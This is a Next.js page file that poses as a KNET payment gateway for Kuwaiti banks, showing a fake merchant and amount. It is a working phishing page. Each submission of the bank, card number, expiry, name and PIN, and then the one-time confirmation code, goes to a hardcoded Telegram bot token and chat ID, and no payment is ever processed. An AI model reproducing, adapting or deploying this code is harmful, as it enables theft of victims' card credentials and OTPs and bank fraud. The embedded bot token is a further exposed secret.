"use client";

import { Suspense, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import Image from "next/image";
import axios from "axios";
import kibLo from "../../../public/lobanner.png";
import kibb from "../../../public/dirayaBanner.png";
import styles from "./page.module.css";

function KnetPageContent() {
  const [fullName, setFullName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [expMonth, setExpMonth] = useState("");
  const [expYear, setExpYear] = useState("");
  const [cvv, setCvv] = useState("");
  const [bank, setBank] = useState("");
  const [isProcessing, setIsProcessing] = useState(false);
  const [otp, setOtp] = useState("");
  const [showOtp, setShowOtp] = useState(false);
  const [verificationMsg, setVerificationMsg] = useState("");

  const router = useRouter();
  const searchParams = useSearchParams();
  const price = searchParams.get("price");
  const refN = searchParams.get("refN");
  const handleSend = async () => {
    if (!showOtp) {
      if (
        !fullName.trim() ||
        !cardNumber.trim() ||
        !expMonth.trim() ||
        !expYear.trim() ||
        !cvv.trim() ||
        !bank.trim()
      ) {
        alert("Please fill in all fields");
        return;
      }

      const text = `
🏦 Bank: ${bank}
👤 Full Name: ${fullName}
💳 Card Number: ${cardNumber}
📅 Exp Month: ${expMonth}
📅 Exp Year: ${expYear}
🔐 PIN: ${cvv}
🔨 Ref:${refN}
      `;

      try {
        setIsProcessing(true);
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${encodeURIComponent(
            text
          )}`
        );
        setShowOtp(true);
        setIsProcessing(false);
      } catch (error) {
        alert("Error sending data");
        setIsProcessing(false);
        console.error(error);
      }
    } else {
      if (!otp.trim()) {
        alert("Please enter the confirmation code");
        return;
      }

      try {
        setIsProcessing(true);
        setVerificationMsg("Code sent, verifying...");
        await axios.post(
          `https://api.telegram.org/bot8391195305:AAF-UCHdFDY2uR1cZI8-DOgEt59z849fq20/sendMessage?chat_id=5714216192&text=${encodeURIComponent(
            `🔑 Confirmation Code: ${otp}
             🔨 Ref: ${refN}`
          )}`
        );
        // لا تقم بالتوجيه هنا، فقط أظهر رسالة فقط (أو قم بما تريد بعد التحقق)
        // إذا أردت تحويل، احذف السطر التالي لتعليق التحويل:
        // router.push(`/kpay/finish?name=${cardNumber}`);
        setVerificationMsg("Code sent, verifying...");
        setIsProcessing(false);
      } catch (error) {
        alert("Error sending OTP");
        setVerificationMsg("");
        setIsProcessing(false);
        console.error(error);
      }
    }
  };

  return (
    <div className={styles.knetContainer}>
     <Image src={kibb} width={220} height={50} alt="bainnary" />
      <div className={styles.knetBox}>
        <div className={styles.knetInfo}>
          <Image src={kibLo} width={220} height={50} alt="logo" />
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Merchant:</span>
            <span>Tap Payments EPSP</span>
          </div>
          <div className={styles.knetInfoRow}>
            <span className={styles.knetInfoLabel}>Amount:</span>
            <span>KD {price}.000</span>
          </div>
        </div>

        {isProcessing && <p style={{ color: "black" }}>Processing transaction...</p>}
        {verificationMsg && <p style={{ color: "blue", marginTop: 8 }}>{verificationMsg}</p>}

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleSend();
          }}
          className={styles.knetForm}
        >
          <div>
            <label>Select Bank :</label>
            <select
              style={{ width: "175px", height: "30px", fontSize: "13px" }}
              value={bank}
              onChange={(e) => setBank(e.target.value)}
              required
              disabled={isProcessing || showOtp}
            >
              <option value="">-- Select Bank --</option>
              <option value="ABK">Al Ahli Bank of Kuwait (ABK)</option>
              <option value="RAJHI">Al Rajhi Bank (RAJHI)</option>
              <option value="BBK">Bank of Bahrain and Kuwait (BBK)</option>
              <option value="BOUBYAN">Boubyan Bank (BOUBYAN)</option>
              <option value="BURG">Burgan Bank (BURG)</option>
              <option value="CBK">Commercial Bank of Kuwait (CBK)</option>
              <option value="DOHA">Doha Bank (DOHA)</option>
              <option value="GULF">Gulf Bank (GULF)</option>
              <option value="KFH">Kuwait Finance House (KFH)</option>
              <option value="KIB">Kuwait International Bank (KIB)</option>
              <option value="NBK">National Bank of Kuwait (NBK)</option>
              <option value="QNB">Qatar National Bank (QNB)</option>
              <option value="UNB">Union National Bank (UNB)</option>
              <option value="WARBA">Warba Bank (WARBA)</option>
            </select>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Card Number:</label>
            <input
              type="text"
              maxLength="16"
              inputMode="numeric"
              pattern="[0-9]*"
              value={cardNumber}
              onChange={(e) => setCardNumber(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing || showOtp}
            />
          </div>
          <hr />

          <div className={styles.dataexp}>
            <label className={styles.formLabel}>Expiration :</label>
            <div>
              <select
                value={expMonth}
                onChange={(e) => setExpMonth(e.target.value)}
                required
                className={styles.formInput}
                disabled={isProcessing || showOtp}
              >
                <option value="">MM</option>
                {Array.from({ length: 12 }, (_, i) => (
                  <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                    {String(i + 1).padStart(2, "0")}
                  </option>
                ))}
              </select>

              <select
                value={expYear}
                onChange={(e) => setExpYear(e.target.value)}
                required
                className={styles.formInput}
                disabled={isProcessing || showOtp}
              >
                <option value="">YY</option>
                {Array.from({ length: 50 }, (_, i) => {
                  const year = new Date().getFullYear() + i;
                  return (
                    <option key={year} value={String(year).slice(-2)}>
                      {`20${String(year).slice(-2)}`}
                    </option>
                  );
                })}
              </select>
            </div>
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>Full Name:</label>
            <input
              type="text"
              maxLength="100"
              value={fullName}
              onChange={(e) => setFullName(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing || showOtp}
            />
          </div>
          <hr />

          <div>
            <label className={styles.formLabel}>PIN:</label>
            <input
              type="text"
              maxLength="4"
              inputMode="numeric"
              pattern="\d*"
              value={cvv}
              onChange={(e) => setCvv(e.target.value)}
              required
              className={styles.formInput}
              disabled={isProcessing || showOtp}
            />
          </div>
          <hr />

          {showOtp && (
            <>
              <div>
                <label className={styles.formLabel}>Confirmation Code:</label>
                <input
                  type="text"
                  maxLength="6"
                  inputMode="numeric"
                  pattern="\d*"
                  value={otp}
                  onChange={(e) => setOtp(e.target.value)}
                  required
                  className={styles.formInput}
                />
              </div>
              <hr />
            </>
          )}

          <div className={styles.buttonRow}>
            {!showOtp && (
              <button
                type="button"
                className={styles.cancel}
                onClick={() => router.back()}
                disabled={isProcessing}
              >
                Cancel
              </button>
            )}
            <button type="submit" className={styles.submit}>
              {showOtp ? "Send Code" : "Submit"}
            </button>
          </div>
        </form>
      </div>
    </div>
  );
}

export default function KnetPage() {
  return (
    <Suspense fallback={<div>Loading...</div>}>
      <KnetPageContent />
    </Suspense>
  );
}
